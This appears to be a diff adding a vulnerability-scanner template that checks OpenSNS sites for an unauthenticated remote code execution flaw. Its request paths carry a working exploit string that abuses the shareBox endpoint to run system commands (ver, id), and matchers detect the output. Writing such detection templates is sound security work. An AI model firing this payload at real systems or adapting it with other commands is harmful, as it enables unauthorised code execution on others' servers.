@@ -1,0 +1,38 @@
+id: opensns-rce
+
+info:
+  name: OpenSNS - Remote Code Execution
+  author: gy741
+  severity: critical
+  description: |
+    OpenSNS allows remote unauthenticated attackers to execute arbitrary code via the 'shareBox' endpoint.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: opensns,rce
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)'
+      - '{{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id=)"
+          - "Microsoft Windows"
+        condition: or
+
+      - type: word
+        words:
+          - "/Application/"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/05/30
